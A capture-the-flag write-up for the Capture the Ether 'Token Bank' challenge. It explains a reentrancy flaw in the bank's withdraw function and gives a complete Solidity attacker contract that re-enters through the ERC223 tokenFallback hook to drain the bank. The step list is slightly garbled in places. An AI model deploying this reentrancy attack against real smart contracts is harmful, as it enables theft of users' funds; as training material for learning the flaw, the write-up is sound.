# Token Bank Capture the ether

## Goals

=> The bank deploys a token called “Simple ERC223 Token” and assigns half the tokens to me and half to you. You win this challenge if you can empty the bank.

### Hints

- None

### Solution

- The weakness is in the Banks `withdraw(uint256 amount)` function since this does an external contract call `require(token.transfer(msg.sender, amount))` beofre updating the balance of the message sender, this external call does another external call if the sent to is a contract to check if he can receive those tokens and implemented the `tokenFallback()` function which we can implement however we want to. Follwing Steps were done:
- Withdraw our 500k tokens from the bank calling as the player `transfer(hackContract, 500000 ether)`
- Send them from the tokenContract to our hackContract `transfer(hackContract, 500000 ether)`
- Deposit them in the bank calling the hackContracts so the Hack contracts `depositTokensAtBank(500000 ether)` => balance is now 500k.
- Call the `attack()` function from the hackContract which will result in having a `tokenContract.balanceOf(hackContract)` of 1 million tokens which you could now withdraw to the player

### Attacker Contract

```solidity
contract Hack {
    TokenBankChallenge tokenBankContract;
    SimpleERC223Token token;
    address OWNER;

    constructor(address _tokenBankContract, address _token) public {
        OWNER = msg.sender;
        tokenBankContract = TokenBankChallenge(_tokenBankContract);
        token = SimpleERC223Token(_token);
    }

    function depositTokensAtBank() public {
        // deposit tokens to be able to withdraw and trigger the fallback / reentrancy
        token.transfer(tokenBankContract, 500000 ether);
    }

    function withdrawStolenFunds() external {
        token.transfer(OWNER, token.balanceOf(address(this)));
    }

    function attack() public {
        // triggers fallback
        tokenBankContract.withdraw(500000 ether);
    }

    function tokenFallback(address from, uint256 value, bytes data) external{
        // !! Not called when the OWNER/Player transfers tokens to our Hack contract !!
        // fallback takes the other half of the funds
        if(token.balanceOf(tokenBankContract) >= 500000 ether && from != OWNER){
        tokenBankContract.withdraw(500000 ether);
        }
    }

}
```
